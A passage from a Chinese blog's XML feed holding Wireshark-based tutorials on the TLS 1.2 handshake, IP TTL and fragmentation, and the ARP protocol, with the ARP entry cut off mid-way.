/></p><p>感觉没啥讲的呢...，自己看吧，挺简单的。</p>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从数据包看 TLS 1.2</title>
      <link href="/blog/2019/07/09/wireshark/tls_protocol_overview/"/>
      <url>/blog/2019/07/09/wireshark/tls_protocol_overview/</url>
      
        <content type="html"><![CDATA[<p>TLS（Transport Layer Security）和它的上一代 SSL（Secure SocketsLayer）都用来提供网络通信安全的加密协议，其中 SSL如今已经不被推荐使用。这些协议的一些版本在 web浏览器、电子邮件、即时通讯以及 IP 电话等方面被广泛地使用着。</p><p>TLS（Transport Layer Security）协议是 Web上最流行的加密协议，它通过确保浏览器与服务端之间的保密性以及数据的完整性来保护Web 上的用户。在本文中，我将介绍 TLS 1.2版本中握手阶段(子协议)的细节。</p><p>TLS 1.2 中所有与握手相关的子协议都在 <ahref="https://www.ietf.org/rfc/rfc5246.txt">RFC5246</a>被定义，下面我将通过 Wireshark 抓包的方式进行讲解</p><h1 id="一.-作用">一. 作用</h1><p>不使用 SSL/TLS 的 HTTP通信，就是不加密的通信。所有信息明文传播，带来了三大风险。</p><blockquote><p>（1）<strong>窃听风险</strong>（eavesdropping）：第三方可以获知通信内容。</p><p>（2）<strong>篡改风险</strong>（tampering）：第三方可以修改通信内容。</p><p>（3）<strong>冒充风险</strong>（pretending）：第三方可以冒充他人身份参与通信。</p></blockquote><p>SSL/TLS 协议是为了解决这三大风险而设计的，希望达到：</p><blockquote><p>（1） 所有信息都是<strong>加密传播</strong>，第三方无法窃听。</p><p>（2）具有<strong>校验机制</strong>，一旦被篡改，通信双方会立刻发现。</p><p>（3） 配备<strong>身份证书</strong>，防止身份被冒充。</p></blockquote><p>互联网是开放环境，通信双方都是未知身份，这为协议的设计带来了很大的难度。而且，协议还必须能够经受所有匪夷所思的攻击，这使得SSL/TLS 协议变得异常复杂。</p><p>二、历史</p><p>互联网加密通信协议的历史，几乎与互联网一样长。</p><blockquote><p>1994 年，NetScape 公司设计了 SSL 协议（Secure Sockets Layer）的 1.0版，但是未发布。</p><p>1995 年，NetScape 公司发布 SSL 2.0 版，很快发现有严重漏洞。</p><p>1996 年，SSL 3.0 版问世，得到大规模应用。</p><p>1999 年，互联网标准化组织 ISOC 接替 NetScape 公司，发布了 SSL的升级版<ahref="http://en.wikipedia.org/wiki/Secure_Sockets_Layer">TLS</a> 1.0版。</p><p>2006 年和 2008 年，TLS 进行了两次升级，分别为 TLS 1.1 版和 TLS 1.2版。最新的变动是 2011 年 TLS 1.2 的<ahref="http://tools.ietf.org/html/rfc6176">修订版</a>。</p></blockquote><p>目前，应用最广泛的是 TLS 1.2，主流浏览器都已经实现了 TLS 1.2的支持。</p><h2 id="三基本的运行过程">三、基本的运行过程</h2><p>SSL / TLS 协议的基本思路是采用<ahref="http://en.wikipedia.org/wiki/Public-key_cryptography">公钥加密法</a>，也就是说，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p><p>但是，这里有两个问题。</p><p><strong>（1）如何保证公钥不被篡改？</strong></p><blockquote><p>解决方法：将公钥放在<ahref="http://en.wikipedia.org/wiki/Digital_certificate">数字证书</a>中。只要证书是可信的，公钥就是可信的。</p></blockquote><p><strong>（2）公钥加密计算量太大，如何减少耗用的时间？</strong></p><blockquote><p>解决方法：每一次对话（session），客户端和服务器端都生成一个"对话密钥"（sessionkey），用它来加密信息。由于"对话密钥"是对称加密，所以运算速度非常快，而服务器公钥只用于加密"对话密钥"本身，这样就减少了加密运算的消耗时间。</p></blockquote><p>因此，SSL/TLS 协议的基本过程是这样的：</p><blockquote><p>（1） 客户端向服务器端索要并验证公钥。</p><p>（2） 双方协商生成"对话密钥"。</p><p>（3） 双方采用"对话密钥"进行加密通信。</p></blockquote><p>上面过程的前两步，又称为"握手阶段"（handshake），握手阶段使用非对称加密算法，通信阶段使用对称算法。</p><h1 id="抓包">抓包</h1><ol type="1"><li><p>打开 Wireshark 进行抓包</p></li><li><p>定位对应网站数据包，两个方法</p><ol type="1"><li><p>ctrl + f ，在捕获过滤器下面出现一个搜索栏，第一个下拉列表选择“分组详情” ，最后一个下拉列表选择“字符串”，搜索你访问的网站的域名，比如:baidu,这样就能定位数据报，也就能定位到其 IP 地址了。</p><p>这样做可行的原因是：在 TLS/SSL 握手的时候，Client Hello报文中会包含服务器的域名。</p></li><li><p>打开浏览器，按 F12，调出开发者工具，选中 network一栏，然后访问一个国内（不用翻墙的网站）的使用 HTTPS的网站，待网页加载完毕。然后在开发者工具中找到网站主页，查看此次访问的IP。</p></li></ol></li></ol><ol start="3" type="1"><li><p>在显示过滤器中输入: ip.addr == 你访问的 ip &amp;&amp; ssl</p><p>更精确的话，可以输入：ip.addr == 你访问的 ip &amp;&amp;tls.handshake</p></li></ol><p>对应方法 b 有两个注意点：</p><ol type="1"><li><p>为什么要在开发者工具里面实时看 IP，而不直接 ping呢？因为现在稍微大一点网站一个域名对应一个主机集群，并不仅仅只是一个主机（IP），所以，即使你在打开网页的同时去在cmd 里面 ping 该域名，你 ping 出来的 IP 也不一定是你刚才访问的IP。</p></li><li><p>为什么要访问不翻墙的网站呢?</p><p>其实你一看开发者工具就知道了，比如你使用Shadowsocks，那么你访问需要翻墙的网站时，在开发者工具里面看到的地址是：127.0.0.0.1:1080.这样，还是找不到 IP 呀。</p></li></ol><p>注：</p><ol type="1"><li>上面找 IP的方法是为了能够找到自己访问的特定网站的数据报所提供，如果你不想找特定网站，那么直接使用显示过滤语法：ssl或者 tls.handshake 即可</li><li>本来想放到后面说，但是还是在前面说的，免得你发现自己的包与我的讲解不太相符。要知道即使都是TLS 1.2 在执行过程中也会有些许不一样（我猜的，因为我自己抓的和网上找的2018 年的一个抓包文件，都是 TLS 1.2但有些小差异，也有可能是小版本改动）。此外，你要是都不是 TLS1.2，那就更不一样了，不过，大体步骤顺序是一样的，原理一样。</li></ol><p>相关知识：</p><blockquote><p>一个域名用 dns 解析到多台服务器，服务器如果做了负载冗余，那么其中一个ip 的服务器宕机了的话，另外一个立马补上而用户去察觉不到冗余：起到的作用是在你主备服务器的主机宕机之后，立刻启动备机防止应用不能访问，提供24小时不间断服务。负载是在一个服务器组中做均衡，提高服务器组的总体运行安全度。这点负载与冗余有很大的相似处。</p></blockquote><p>先放两个图，下面使用一张图来讲解。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/icourse_tls.png" /></p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tls.png" /></p><h1 id="原理步骤">原理步骤</h1><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/tls_handshake.png" /></p><p>"握手阶段"涉及四次通信，我们一个个来看。需要注意的是，"握手阶段"的所有通信都是明文的。</p><h2 id="client-hello"><strong>Client Hello</strong></h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/client_hello_proc.jpg"alt="client hello" /><figcaption aria-hidden="true">client hello</figcaption></figure><p>客户端发送 “Client Hello” 报文给服务端</p><p>如果客户端（ Web 浏览器或 手机应用）发起一个 TLS 握手，它将会在“Client Hello” 报文中发送下列重要的参数：</p><ul><li><p>随机字节：客户端使用一个安全的随机数产生器产生随机字节。随机数生成的熵源将取决于操作系统和客户端软件的实现，稍后参与生成“对话密钥”</p></li><li><p>会话 ID：如果客户端与服务端在过去建立过一个 TLS会话，该标识符便可以具有先前的会话 ID值，如截图所示，其可以用于更新该会话的加密参数。对于新会话，此字段为空白，这里涉及会话复用知识，会考虑再加一篇文章或给出参考资料。</p></li><li><p>加密套件列表：客户端还会根据它的偏好发送一个它支持的加密套件列表，在此图中，客户端最钟情的加密套件是TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256，然而，我们可以看到服务端选择了第二个套件（在下一步中可以看到），这一长串的加密名字表示什么呢？以TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 为例，如下图所示：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/format.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>密钥交换使用 ECDHE 算法，服务身份验证使用 RSA 算法，数据传输加密使用AES（+GCM），握手使用 SHA256 检验。</p><p>换句话说，证书签名使用 RSA，如果证书验证正确，那么将使用 ECDHE算法进行密钥交换，保证浏览器和服务拥有相同的私有密钥，然后一方使用这把密钥进行AES 数据加密，另一方使用相同的密钥进行 AES数据解密。验证证书签名合法性和密钥交换的身份确认都是使用 SHA256这个哈希算法进行检验。具体过程下文展开描述。</p></li><li><p>Compression Method 压缩方式，可以展开下拉列表，默认是null。0，即：不使用压缩。</p></li><li><p>下面我们可以看一看 Extension</p><ol type="1"><li>Reserverd 是保留</li><li>server_name服务器名，可以下拉列表展开，这里可以看到，我是抓的包的服务端是www.icourse163.org，就是中国大学 MOOC。</li><li>session_ticket 会话票据，客户端发起 client hello，Extention中带上空的 session ticket TLS，表明自己支持 session ticket。</li><li>supported_version 包含 Client 支持的 TLS 协议版本。</li><li>以后有重要的再补充</li></ol></li></ul><h2 id="server-hello">Server Hello</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/serverhello_proc.jpg"alt="server hello" /><figcaption aria-hidden="true">server hello</figcaption></figure><p>“Server Hello” 报文是用来回应 “Client Hello” 报文的。</p><p>服务器收到客户端请求后，向客户端发出回应，这叫做 ServerHello。服务器从收到的客户端请求的加密方法列表选择一组它支持的加密方法，如果该列表中不包括服务器认可、支持或想要使用的加密方法组，那么服务器将会忽略这些密文，如果服务器找不到自己支持的加密组，那么它将发送失败警告并关闭连接。</p><p>服务器的回应内容包括以下内容</p><ul><li>随机数：服务端生成一个与客户端独立（无关）的随机数，稍后参与生成“对话密钥”</li><li>加密通信协议版本和加密套件：如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。在本次抓包中，服务端选择了客户端第二偏好的加密套件：<code>TLS 1.2 with TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</code>.</li><li>Session ID : 这里返回的 session ID 为0，即：服务器没有进行会话复用。原因是因为服务器会话老化了，服务期开启了新的会话，新的会话的会话ID 为 0</li><li>带有证书链的服务器证书（客户端信任库中存储的证书将验证该证书链）</li></ul><p>除了上面这些信息，如果服务器需要确认客户端的身份，就会再包含一项请求，要求客户端提供"客户端证书"，比如，金融机构往往只允许认证客户连入自己的网络，就会向正式客户提供USB 密钥，里面就包含了一张客户端证书。</p><h2 id="server-certificate">Server Certificate</h2><p>在 “server hello” 完成之后，服务端必须发送能够被浏览器或移动设备的根CA 验证的证书或证书链，根据上面显示的数字，这些证书是被www.icouse163.com服务器发送的。（客户端收到服务器回应以后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。）</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/cert.png"alt="Certificate" /><figcaption aria-hidden="true">Certificate</figcaption></figure><p>CA（<em>certification authority</em>）是以构建在公钥基础设施PKI（public keyinfrastructure）基础之上的产生和确定数字证书的第三方可信机构（trustedthirdparty）。在这里，我将简要介绍一下当浏览器收到服务端的证书时发生了些什么。基于PKI 的 CA 和 TLS 协议结合起来能提供很好的安全性。要知道，我们对根证书有无条件的信任。注意下面一段的内容并不属于 TLS协议的一部分。</p><p>“加密”字段实际上是与第一个证书相关联的数字签名。“encrypted”字段上方的“algorithmIdentifier”字段表示sha256WithRSAEncryption 。这意味着第一个证书的 SHA-256哈希值是使用上面的证书颁发机构的 RSA（私有）密钥签名的。浏览器使用证书中与之相对应的公钥来验证签名。继续相同的验证步骤，直到 CA证书正好位于根 CA 之下。根 CA 证书不需要验证，因为它由浏览器隐式信任。请注意，“algorithmIdentifier” 值与前面描述的“密码套件不相关。现在，在此消息中突出显示一个字段非常重要。嵌入在证书链中第一个证书中的公钥如下图所示：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/rsa_pukey.png"alt="www.icourse163.com 在第一个证书中的公钥" /><figcaption aria-hidden="true">www.icourse163.com在第一个证书中的公钥</figcaption></figure><p>此证书包含 www.icourse163.com 服务器的 RSA公钥（以及相关的数学参数），因为服务器选择了包含 RSA作为数字签名算法的密码套件。该公钥将在握手的后续步骤中用于数字签名。</p><h2 id="server-key-exchange-server-hello-done">Server Key Exchange &amp;Server Hello Done</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/server_exchage.png"alt="server_exchage" /><figcaption aria-hidden="true">server_exchage</figcaption></figure><p>服务器在 “server key exchange message” 消息中发送它的参数</p><p>握手协议的下一步是交换用于生成对称密钥的参数以加密所有未来的应用程序数据。当服务器和客户端同意使用 Elliptic Curve Diffie-HellmanEphemeral（ECDHE）时，他们需要交换 ECDHE算法中使用的公共参数。加密细节超出了这里的范围。但是，请注意此处发送的三个突出显示的值：</p><ul><li>命名曲线：服务器为计算选择的椭圆曲线。</li><li>公钥：客户端使用的服务器的公共组件。</li><li>签名：使用服务器的私有 RSA密钥对值进行签名，以便客户端可以验证（使用证书中的相应公钥）ECDHE参数确实来自与其通信的服务器而不是攻击者。</li></ul><p>“Server Hello done” 意味着 “Server Hello” 报文的结束</p><h2id="client-key-exchange-change-cipher-spec-encrypted-handshake">ClientKey Exchange / Change Cipher Spec /Encrypted handshake</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/key_change.png"alt="key_change" /><figcaption aria-hidden="true">key_change</figcaption></figure><p><strong>Client Key Exchange</strong></p><p>“Client Key Exchange” 包含客户端的供 ECDHE使用的公共参数，在这种情况下，客户端参数并未签名。</p><p>现在，在我们查看上面屏幕截图中的其他消息之前，让我们先看看客户端和服务器如何生成密钥（称为主密钥）。</p><p>根据 8.1 RFC 5246，master_secret 的公式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master_secret = PRF(pre_master_secret, &quot;master secret&quot;,   ClientHello.random + ServerHello.random)</span><br></pre></td></tr></table></figure><p>上面提到的* pre_master_secret *实际上是服务器和客户端使用 ECDHE算法计算的密钥。伪随机函数（PRF）实际上是 HMAC-SHA256。ClientHello.random 和 ServerHello.random 是在初始 hello消息期间分别由客户端和服务器生成和交换的随机值。字符串 “master secret”也用在 PRF 中。 master_secret 长 48 个字节。</p><p>至于为什么一定要用三个随机数，来生成"会话密钥"，<ahref="http://blog.csdn.net/dog250/article/details/5717162">dog250</a>解释得很好：</p><blockquote><p>"不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。</p><p>对于 RSA 密钥交换算法来说，pre-master-key 本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。</p><p>pre master 的存在在于 SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么 premaster secret 就有可能被猜出来，那么仅适用 pre master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上 premaster secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。"</p></blockquote><p>此时，重要的是指出一个在 TLS 记录协议中执行关于 master_secret的操作。 TLS记录协议是一个单独的子协议，用于实际加密和传输高级协议数据，如HTTP。使用 TLS 记录协议中的 PRF 将主密钥“扩展”为更多秘密。 从master_secret 派生的密钥在 RFC 规范的<ahref="https://tools.ietf.org/html/rfc5246#section-6.3">section6.3</a>中命名如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client_write_MAC_key[SecurityParameters.mac_key_length]   server_write_MAC_key[SecurityParameters.mac_key_length]   client_write_key[SecurityParameters.enc_key_length]      server_write_key[SecurityParameters.enc_key_length]      client_write_IV[SecurityParameters.fixed_iv_length]      server_write_IV[SecurityParameters.fixed_iv_length]</span><br></pre></td></tr></table></figure><p>可以猜测，“写密钥”用于加密数据。 “写 MAC” 密钥用于计算应用级数据的MAC。仅在密码套件需要时才计算初始化向量（IV）。由于客户端和服务器都具有所有这些密钥，因此它们可以解密并验证消息的完整性。</p><p><strong>Change Cipher Spec</strong></p><p>Change Cipher Spec 是 TLS 中的一个单独的子协议，用于指示 TLS协商中的任何一方将使用协商的密钥和算法加密后续消息。</p><p><strong>Encrypted Handshake Message (Finished Message)</strong></p><p>你们中的一些人可能想知道握手消息中中间人攻击（Man-In-The-Middle）的可能性。例如，如果攻击者改变客户端发送的密码套件列表以使服务器选择相对较弱的密码套件，该怎么办？TLS 协议确实使用 Finished Message 来防止 MITM 攻击，它在 Change CipherSpec 消息之后发送。 屏幕截图中的“加密握手消息”将是一个 HMAC-SHA256。他有下列属性</p><ol type="1"><li>有着 主密钥（master_secret）</li><li>所有先前握手消息的哈希值（从 ClientHello 到 Finished Message，不包括此 Finished Message ）</li><li>结束标志字符串（客户端消息为“client finished”，服务器消息为“serverfinished”）</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">verify_data</span><br><span class="line">PRF(master_secret, finished_label, Hash(handshake_messages))(quoted from section 7.4.9 of RFC 5246)</span><br></pre></td></tr></table></figure><p>如果服务器或客户端无法验证握手消息的完整性，则 TLS 握手失败。</p><h2 id="encrypted-application-data">Encrypted Application Data</h2><p>在握手完成后，传送加密的数据。</p><ul><li>MAC-then-Encrypt：在明文上计算MAC，将其附加到数据，然后加密整个（这就是<ahref="http://tools.ietf.org/html/rfc5246">TLS</a>所做的）</li><li>加密和 MAC：在明文上计算 MAC，加密明文，然后将 MAC附加到密文的末尾（这就是 SSH 所做的）</li><li>Encrypt-then-MAC：加密明文，然后在密文上计算MAC，并将其附加到密文（在这种情况下，我们不要忘记将初始化矢量（IV）和加密方法标识符包含在MACed 数据中）</li></ul><p>前两个选项通常称为“MAC-then-encrypt”，而第三个选项则是“encrypt-then-MAC”。</p><p>直到 TLS 1.2，“MAC-then-Encrypt” 技术仍然用来从上层（ TLS record协议）加密和保证数据的完整性。首先，使用 客户端的 client_write_MAC_key或 服务端的 server_write_MAC_key 来创建消息的 MAC，然后明文数据和 MAC被客户端使用 client_write_key 和服务端使用 server_write_key各自加密。</p><p>参考资料</p><blockquote><ol type="1"><li><a href="https://www.ietf.org/rfc/rfc5246.txt">RFC 5246</a></li><li><ahref="https://blog.csdn.net/mrpre/article/details/77868669">TLS/SSL会话复用</a></li><li><ahref="https://medium.com/@ethicalevil/tls-handshake-protocol-overview-a39e8eee2cf5">TLS1.2 hand shake</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP协议</title>
      <link href="/blog/2019/07/07/wireshark/ip_protocol/"/>
      <url>/blog/2019/07/07/wireshark/ip_protocol/</url>
      
        <content type="html"><![CDATA[<p>目的：</p><ol type="1"><li>IP 协议的基本概念以及它在 OSI 模型中的位置</li><li>存活时间以及 IP 分片的基本概念</li><li>学会利用 Wireshark 分析捕获文件中的 TTL 和 IP 分片</li><li>掌握捕获 IP 数据包的方法</li></ol><h2 id="两个重要概念">两个重要概念：</h2><h3 id="ttl">TTL</h3><p>TTL 是生存时间的意思，就是说这个 ping的数据包能在网络上存在多少时间。当我们对网络上的主机进行 ping操作的时候，本地机器会发出一个数据包，数据包经过一定数量的路由器传送到目的主机，但是由于很多的原因，一些数据包不能正常传送到目的主机，那如果不给这些数据包一个生存时间的话，这些数据包会一直在网络上传送，导致网络开销的增大。当数据包传送到一个路由器之后，TTL就自动减 1，如果减到 0 了还是没有传送到目的主机，那么就自动丢失</p><p>TTL 的主要作用是避免 IP包在网络中的无限循环和收发，节省了网络资源，并能使 IP包的发送者能收到告警消息</p><h3 id="ip-分片">IP 分片</h3><h4 id="原理">原理</h4><p>IP 协议理论上允许的最大 IP 数据报为 65535 字节（16位来表示包总长）。但是因为协议栈网络层下面的数据链路层一般允许的帧长远远小于这个值，例如以太网的MTU（即 Maximum Transmission Unit，最大传输单元）通常在 1500字节左右。所以较大的 IP 数据包会被分片传递给数据链路层发送，分片的 IP数据报可能会以不同的路径传输到接收主机，接收主机通过一系列的重组，将其还原为一个完整的IP 数据报，再提交给上层协议处理。上图中的红色字段便是被设计用来处理 IP数据包分片和重组的。</p><h2 id="抓包分析">抓包分析</h2><p>（这里使用其他旧版教程截图，因为我死活抓不到带多个分片的批数据包emmm，注意：新版 Wireshark 的 偏移量 offset 在 Flags的展开列表里，对，新版的 Flags 那里可以展开显示标志位及偏移）</p><p>控制标志：</p><blockquote><p>Bit 0: reserved, must be zero Bit 1:(DF) 0=May Fragment, 1=Don'tFragment. Bit 2:(MF) 0=Last Fragment, 1=More Fragments.</p></blockquote><p>可以在显示过滤器中使用，下面给出几个常用功能语句示例：</p><p>ip.flags.mf == 1 过滤出一系列分片的数据帧除去最后一个的其他帧</p><p>ip.flags.mf == 0 过滤出一系列分片的数据帧的最后一个</p><p>ip.frag_offset &gt; 0 过滤出分片数据帧中偏移量大于 0的数据帧（即：除了第一个片帧之外的其他帧）</p><p>ip.frag_offset==0 过滤出第一片帧以及未分片的数据</p><p>ip.flags.mf== 1 &amp;&amp; ip.frag_offset == 0 过滤出第一片帧</p><p>ip.flags.mf == 1 or ip.frag_offset &gt; 0过滤出出去第一片和最后一片的片帧</p><p>第一片：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment1.png"alt="First Fragment" /><figcaption aria-hidden="true">First Fragment</figcaption></figure><p>Identification：用于片的重组，具有相同 idetification的片重组为一个分组。</p><p>Flags 为 1，意味这后面还有更多片帧</p><p>Fragment offset 偏移为 0，意味着它是第一片帧</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment2.png"alt="Second Fragment" /><figcaption aria-hidden="true">Second Fragment</figcaption></figure><p>Identification：与第一片相同</p><p>Flags 为 1，意味这后面还有更多片帧</p><p>Fragment offset 偏移为 1480，即：MTU（1500）- IPheader（20），意味着它是第二片帧</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/ip_fragment3.png"alt="Third Fragment" /><figcaption aria-hidden="true">Third Fragment</figcaption></figure><p>Identification：与第一片相同</p><p>Flags 为 0，意味这是一系列分片的最后一片帧</p><p>Fragment offset 偏移为 2960，即：1480 *2，意味着它是第三片帧，恰好分片分满结束。</p><p>大体完成，待完善...</p><p>参考资料:</p><blockquote><ul><li><a href="https://my.oschina.net/xinxingegeya/blog/483138">IP数据报分片——Fragmentation 和重组</a></li><li><a href="https://www.wireshark.org/docs/dfref/i/ip.html">ip相关显示过滤器语法</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP协议</title>
      <link href="/blog/2019/07/07/wireshark/arp_protocol/"/>
      <url>/blog/2019/07/07/wireshark/arp_protocol/</url>
      
        <content type="html"><![CDATA[<h1 id="目的">目的</h1><ol type="1"><li>学习 ARP 协议原理，掌握 ARP 请求数据报以及响应数据包的各自特点</li><li>学会使用 Wireshark 分析 ARP数据报，掌握请求以及响应数据报的分析方法以及各自的特点。</li><li>分析免费 ARP 的特点，并与正常 ARP 请求的数据报作对比</li></ol><h1 id="arpaddress-resolution-protocol">ARP（Address ResolutionProtocol）</h1><h2 id="简介">简介</h2><p>ARP 的全称是 Address Resolution Protocol，直译过来是<strong>地址解析协议</strong>。对应的 RFC 文档是 <ahref="https://tools.ietf.org/html/rfc826">RFC826</a>。它的作用是把 IP地址转换为 MAC 地址。为什么需要做这件事呢？</p><p>这是因为 TCP/IP 网络协议栈是分层的，每层负责不同的功能。IP 层（layer3）负责路由寻路，换句话说，如果目的机器和客户端不在同一个网络，IP层会穿过错综复杂的中间网络（互联网）找到目的机器所在的网络。</p><p>当报文在某一个网络中传播时（可能源机器和目的机器本来就在同一个网络，也可能报文在路由过程中执行下一跳步骤），IP层的功能就没有用了，这时候起作用的是 2层网络（链路层），大多数情况下就是以太网。以太网负责把多个机器连到一起，组成一个最小单位的局域网。在以太网中，不同机器的标识是MAC 地址，MAC 地址是机器在生产的时候厂商为机器设定的。</p><p>有了 MAC 地址，同一个以太网络上的两台机器才能够通信。机器 A需要知道机器 B 的 MAC地址，才能发送以太网帧；交换机收到报文之后，根据目的 MAC地址决定应该从哪个端口发送出去；目的机器读取报文的 MAC地址才能知道报文是不是要发给自己的。</p><p>最开始的时候，机器 A 只知道目的地址的 IP（用户用某种方式输入 IP地址，或者通过 DNS 解析出来 IP 地址），不知道对方的 MAC地址。这时候，机器 A 会发送 ARP 报文，去查询机器 B 的 MAC 地址，拿到 MAC地址，就能完成通信的过程。</p><p>ARP 协议的内容，以及怎么拿到 MAC 地址就是这篇文章接下来要讲解的。</p><h2 id="原理">原理</h2><ol type="1"><li>机器 A 想和同一个以太网络的机器 B 通信，A 会现在自己的 ARP 表中查找B 的 MAC地址，如果能找到就直接发送以太网帧；如果没有找到，就跳到第二步</li><li>机器 A 发送 ARP 请求报文去查询机器 B 的 MAC地址，这是个以太网广播报文，因此交换机会广播到网络中所有的机器</li><li>各个主机接收到 ARP 请求报文，如果发现 ARP 报文中询问的 IP地址和自己不同，则直接丢弃；机器 B 发现 ARP 报文中询问的 IP地址是自己的主机地址，则生成一个 ARP 应答报文，把自己的 MAC地址填到报文中，发送给机器A，这个报文是单播报文，不会发送给其他主机；同时机器 B 也会把机器 A 的ARP 记录缓存起来</li><li>机器 A 接收到 B 发来的 ARP 应答，读取报文中 B 的 MAC 地址，使用这个MAC 地址和机器 B 进行后续的通信，同时把它缓存到系统中</li></ol><h2 id="协议格式">协议格式</h2><p>ARP 报文格式如下图所示，对于 IP 地址转换为 MAC 地址来说，ARP报文长度为 28 字节。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arpformat.png"alt="ARP Format" /><figcaption aria-hidden="true">ARP Format</figcaption></figure><p>各个字段的含义为：</p><ul><li><code>Hardware Type</code>：传输 ARP报文的物理网络类型，最常见的是以太网类型，对应的值是 1。这个字段的长度是2 字节</li><li><code>Protocol Type</code>：网络报文类型，字段长度是 2字节。最常用的是 IPv4 报文，对应的值是 2048（十六进制为0x0800，这和以太网帧中帧类型字段使用的 IP报文类型相同，这是有意设计的）</li><li><code>Hardware Address Length</code>（Hardwaresize）：物理地址长度，字段长度是 1 比特。ARP 协议报文中物理地址（MAC地址）有多少比特，对于大部分网络来说，这个值是 6（因为 MAC 地址是 6个字节，48 比特长）</li><li><code>Protocol Address Length</code>（Protocolsize）：网络地址长度，字段长度是 1 比特。表示 ARP 协议报文中网络地址（IP地址）有多少比特，对于大部分网络来说，这个值是 4（因为 IPv4 地址是 4个字节，32 比特）</li><li><code>Opcode</code>：ARP 报文的类型，接下来我们会看到几种不同的 ARP报文。这个字段占用 2 个比特，值为 1 代表 ARP 请求报文，值为 2 代表 ARP应答报文，3 代表 RARP 请求报文，4 代表 RARP 应答报文</li><li><code>Sender Hardware Address</code>：当前 ARP报文的发送方的物理地址（MAC 地址）</li><li><code>Send Protocol Address</code>：当前 ARP报文发送发的网络地址（IPv4 地址）</li><li><code>Target Hardware Address</code>：当前 ARP报文接收方的物理地址（MAC 地址），如果是 ARP情况，这个字段为空（因为发送方正是因为不知道对方的 MAC 地址，才会使用ARP 来解析）</li><li><code>Target Protocol Address</code>：当前 ARP报文接收方的网络地址（IPv4 地址）</li></ul><p>需要注意的是，虽然 ARP 协议目前最常用的场景是把 IP 地址转换为 MAC地址，但是它设计之初却是为了更一般的场景。它的硬件类型、协议类型就是为了指明要转换地址的双方；而硬件地址长度和协议地址长度指定双方的地址长度（每种协议的地址长度可以会发生变化），其对应的就是头部最后面四个地址长度。</p><p>也就是说，ARP本身可以转换其他硬件地址和网络地址，而且允许它们的地址长度是可变的。这导致ARP 协议现在看来是有点冗余的，毕竟 IPv4 和 MAC地址长度都是固定的，没有必要在协议中指定。</p><p>ARP 发送出去会被封装在以太网帧里，ARP 报文中有发送端的 MAC地址，而以太网帧的报文头部也包含了发送端的 MAC地址，也就是说报文中有完全重复的信息。</p><h1 id="抓包分析">抓包分析</h1><p>下面是一对 ARP 请求与响应包</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/packet.png"alt="Packets" /><figcaption 